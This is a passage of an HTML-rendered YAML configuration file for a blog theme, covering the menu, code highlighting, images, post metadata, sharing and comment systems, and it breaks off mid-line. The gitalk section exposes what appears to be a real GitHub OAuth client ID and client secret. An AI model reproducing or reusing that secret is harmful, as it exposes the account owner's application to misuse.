class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br></pre></td><td class="code"><pre><span class="line"># Main menu navigation (導航目錄)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># format: name: link || icon</span><br><span class="line"># sub-menu</span><br><span class="line"># name || icon:</span><br><span class="line">#   name || link || icon</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line">   Home: &#x2F; || fas fa-home</span><br><span class="line">   Archives: &#x2F;archives&#x2F; || fas fa-archive</span><br><span class="line">  #Tags: &#x2F;tags&#x2F; || fas fa-tags</span><br><span class="line">  #Categories: &#x2F;categories&#x2F; || fas fa-folder-open</span><br><span class="line">  # List||fas fa-list:</span><br><span class="line">  #   - Music || &#x2F;music&#x2F; || fas fa-music</span><br><span class="line">  #   - Movie || &#x2F;movies&#x2F; || fas fa-video</span><br><span class="line">   Link: &#x2F;link&#x2F; || fas fa-link</span><br><span class="line">   About: &#x2F;about&#x2F; || fas fa-heart</span><br><span class="line"></span><br><span class="line"># Hide the child menu items in mobile sidebar</span><br><span class="line">hide_sidebar_menu_child: false</span><br><span class="line"></span><br><span class="line"># Code Blocks (代碼相關)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">highlight_theme: mac #  darker &#x2F; pale night &#x2F; light &#x2F; ocean &#x2F; mac &#x2F; mac light &#x2F; false</span><br><span class="line">highlight_copy: true # copy button</span><br><span class="line">highlight_lang: true # show the code language</span><br><span class="line">highlight_shrink: false # true: shrink the code blocks &#x2F; false: expand the code blocks | none: expand code blocks and hide the button</span><br><span class="line">code_word_wrap: false</span><br><span class="line"></span><br><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true</span><br><span class="line">  copyright:</span><br><span class="line">    enable: false</span><br><span class="line">    limit_count: 50</span><br><span class="line"></span><br><span class="line"># social settings (社交圖標設置)</span><br><span class="line"># formal:</span><br><span class="line">#   icon: link || the description</span><br><span class="line">social:</span><br><span class="line">  # fab fa-github: https:&#x2F;&#x2F;github.com&#x2F;xxxxx || Github</span><br><span class="line">  # fas fa-envelope: mailto:xxxxxx@gmail.com || Email</span><br><span class="line"></span><br><span class="line"># search (搜索)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Algolia search</span><br><span class="line">algolia_search:</span><br><span class="line">  enable: false</span><br><span class="line">  hits:</span><br><span class="line">    per_page: 6</span><br><span class="line"></span><br><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: false</span><br><span class="line"></span><br><span class="line"># Math (數學)</span><br><span class="line"># --------------------------------------</span><br><span class="line"># About the per_page</span><br><span class="line"># if you set it to true, it will load mathjax&#x2F;katex script in each page (true 表示每一頁都加載js)</span><br><span class="line"># if you set it to false, it will load mathjax&#x2F;katex script according to your setting (add the &#39;mathjax: true&#39; in page&#39;s front-matter)</span><br><span class="line"># (false 需要時加載，須在使用的 Markdown Front-matter 加上 mathjax: true)</span><br><span class="line"></span><br><span class="line"># MathJax</span><br><span class="line">mathjax:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line"></span><br><span class="line"># KaTeX</span><br><span class="line">katex:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line">  hide_scrollbar: true</span><br><span class="line"></span><br><span class="line"># Image (圖片設置)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Favicon（網站圖標）</span><br><span class="line">favicon: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201228205809.JPG</span><br><span class="line"></span><br><span class="line"># Avatar (頭像)</span><br><span class="line">avatar:</span><br><span class="line">  img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201228205809.JPG</span><br><span class="line">  effect: false</span><br><span class="line"></span><br><span class="line"># The banner image of home page</span><br><span class="line">index_img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201108134100.jpg</span><br><span class="line"># If the banner of page not setting, it will show the top_img</span><br><span class="line">default_top_img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20201108134100.jpg</span><br><span class="line"></span><br><span class="line"># The banner image of archive page</span><br><span class="line">archive_img: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20200825211012.jpg</span><br><span class="line"></span><br><span class="line"># If the banner of tag page not setting, it will show the top_img</span><br><span class="line"># note: tag page, not tags page (子標籤頁面的 top_img)</span><br><span class="line">tag_img:</span><br><span class="line"></span><br><span class="line"># The banner image of tag page</span><br><span class="line"># format:</span><br><span class="line">#  - tag name: xxxxx</span><br><span class="line">tag_per_img:</span><br><span class="line"></span><br><span class="line"># If the banner of category page not setting, it will show the top_img</span><br><span class="line"># note: category page, not categories page (子分類頁面的 top_img)</span><br><span class="line">category_img:</span><br><span class="line"></span><br><span class="line"># The banner image of category page</span><br><span class="line"># format:</span><br><span class="line">#  - category name: xxxxx</span><br><span class="line">category_per_img:</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  # display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: false</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: false</span><br><span class="line">  # the position of cover in home page (封面顯示的位置)</span><br><span class="line">  # left&#x2F;right&#x2F;both</span><br><span class="line">  position: left</span><br><span class="line">  # When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20200825210300.jpg</span><br><span class="line"></span><br><span class="line"># Replace Broken Images (替換無法顯示的圖片)</span><br><span class="line">error_img:</span><br><span class="line">  flink: &#x2F;img&#x2F;friend_404.gif</span><br><span class="line">  post_page: &#x2F;img&#x2F;404.jpg</span><br><span class="line"></span><br><span class="line"># A simple 404 page</span><br><span class="line">error_404:</span><br><span class="line">  enable: false</span><br><span class="line">  subtitle: &#39;Page Not Found&#39;</span><br><span class="line">  background: https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;05&#x2F;19&#x2F;aKOcLiyPl2JQdFD.png</span><br><span class="line"></span><br><span class="line">post_meta:</span><br><span class="line">  page: # Home Page</span><br><span class="line">    date_type: both # created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: date # date&#x2F;relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 主頁是否顯示分類</span><br><span class="line">    tags: false # true or false 主頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line">  post:</span><br><span class="line">    date_type: both # created or updated or both 文章頁日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: date # date&#x2F;relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 文章頁是否顯示分類</span><br><span class="line">    tags: true # true or false 文章頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line"></span><br><span class="line"># wordcount (字數統計)</span><br><span class="line">wordcount:</span><br><span class="line">  enable: false</span><br><span class="line">  post_wordcount: true</span><br><span class="line">  min2read: true</span><br><span class="line">  total_wordcount: true</span><br><span class="line"></span><br><span class="line"># Display the article introduction on homepage</span><br><span class="line"># 1: description</span><br><span class="line"># 2: both (if the description exists, it will show description, or show the auto_excerpt)</span><br><span class="line"># 3: auto_excerpt (default)</span><br><span class="line"># false: do not show the article introduction</span><br><span class="line">index_post_content:</span><br><span class="line">  method: 2</span><br><span class="line">  length: 200 # if you set method to 2 or 3, the length need to config</span><br><span class="line"></span><br><span class="line"># Post</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># toc (目錄)</span><br><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line">  number: true</span><br><span class="line"></span><br><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  decode: false</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;4.0&#x2F;</span><br><span class="line"></span><br><span class="line"># Sponsor&#x2F;reward</span><br><span class="line">reward:</span><br><span class="line">  enable: false</span><br><span class="line">  QR_code:</span><br><span class="line">    # - img: &#x2F;img&#x2F;wechat.jpg</span><br><span class="line">    #   link:</span><br><span class="line">    #   text: wechat</span><br><span class="line">    # - img: &#x2F;img&#x2F;alipay.jpg</span><br><span class="line">    #   link:</span><br><span class="line">    #   text: alipay</span><br><span class="line"></span><br><span class="line"># Related Articles</span><br><span class="line">related_post:</span><br><span class="line">  enable: true</span><br><span class="line">  limit: 6 # Number of posts displayed</span><br><span class="line">  date_type: created # or created or updated 文章日期顯示創建日或者更新日</span><br><span class="line"></span><br><span class="line"># figcaption (圖片描述文字)</span><br><span class="line">photofigcaption: false</span><br><span class="line"></span><br><span class="line"># anchor</span><br><span class="line"># when you scroll in post, the URL will update according to header id.</span><br><span class="line">anchor: false</span><br><span class="line"></span><br><span class="line"># Displays outdated notice for a post (文章過期提醒)</span><br><span class="line">noticeOutdate:</span><br><span class="line">  enable: false</span><br><span class="line">  style: flat # style: simple&#x2F;flat</span><br><span class="line">  limit_day: 500 # When will it be shown</span><br><span class="line">  position: top # position: top&#x2F;bottom</span><br><span class="line">  message_prev: It has been</span><br><span class="line">  message_next: days since the last update, the content of the article may be outdated.</span><br><span class="line"></span><br><span class="line"># Share System (分享功能)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># AddThis</span><br><span class="line"># https:&#x2F;&#x2F;www.addthis.com&#x2F;</span><br><span class="line">addThis:</span><br><span class="line">  enable: false</span><br><span class="line">  pubid:</span><br><span class="line"></span><br><span class="line"># Share.js</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;overtrue&#x2F;share.js</span><br><span class="line">sharejs:</span><br><span class="line">  enable: true</span><br><span class="line">  sites: facebook,twitter,wechat,weibo,qq</span><br><span class="line"></span><br><span class="line"># AddToAny</span><br><span class="line"># https:&#x2F;&#x2F;www.addtoany.com&#x2F;</span><br><span class="line">addtoany:</span><br><span class="line">  enable: false</span><br><span class="line">  item: facebook,twitter,wechat,sina_weibo,facebook_messenger,email,copy_link</span><br><span class="line"></span><br><span class="line"># Comments System</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">comments:</span><br><span class="line">  # Up to two comments system, the first will be shown as default</span><br><span class="line">  # Choose: Disqus&#x2F;Disqusjs&#x2F;Livere&#x2F;Gitalk&#x2F;Valine&#x2F;Utterances&#x2F;Facebook Comments</span><br><span class="line">  use:</span><br><span class="line">  # - Valine</span><br><span class="line">  # - Disqus</span><br><span class="line">  text: true # Display the comment name next to the button</span><br><span class="line">  # lazyload: The comment system will be load when comment element enters the browser&#39;s viewport.</span><br><span class="line">  # If you set it to true, the comment count will be invalid</span><br><span class="line">  lazyload: false</span><br><span class="line">  count: false # Display comment count in top_img</span><br><span class="line"></span><br><span class="line"># disqus</span><br><span class="line"># https:&#x2F;&#x2F;disqus.com&#x2F;</span><br><span class="line">disqus:</span><br><span class="line">  shortname:</span><br><span class="line"></span><br><span class="line"># Alternative Disqus - Render comments with Disqus API</span><br><span class="line"># DisqusJS 評論系統，可以實現在網路審查地區載入 Disqus 評論列表，兼容原版</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;SukkaW&#x2F;DisqusJS</span><br><span class="line">disqusjs:</span><br><span class="line">  shortname:</span><br><span class="line">  siteName:</span><br><span class="line">  apikey:</span><br><span class="line">  api:</span><br><span class="line">  nocomment: # display when a blog post or an article has no comment attached</span><br><span class="line">  admin:</span><br><span class="line">  adminLabel:</span><br><span class="line"></span><br><span class="line"># livere (來必力)</span><br><span class="line"># https:&#x2F;&#x2F;www.livere.com&#x2F;</span><br><span class="line">livere:</span><br><span class="line">  uid:</span><br><span class="line"></span><br><span class="line"># gitalk</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;gitalk&#x2F;gitalk</span><br><span class="line">gitalk:</span><br><span class="line">  client_id: 6ceed9c245da8d33222a</span><br><span class="line">  client_secret: 143c0add0301972b963c8f672bf4e58a092673fb</span><br><span class="line">  repo: Gitalk</span><br><span class="line">  owner: ifonly-go2019</span><br><span class="line">  admin: ifonly-go2019</span><br><span class="line">  language: zh-CN # en, zh-CN, zh-TW, es-ES, fr, ru</span><br><span class="line">  perPage: 10 # Pagination size, with maximum 100.</span><br><span class="line">  distractionFreeMode: false # Facebook-like distraction free mode.</span><br><span class="line">  pagerDirection: last # Comment sorting direction, available values are last and first.</span><br><span 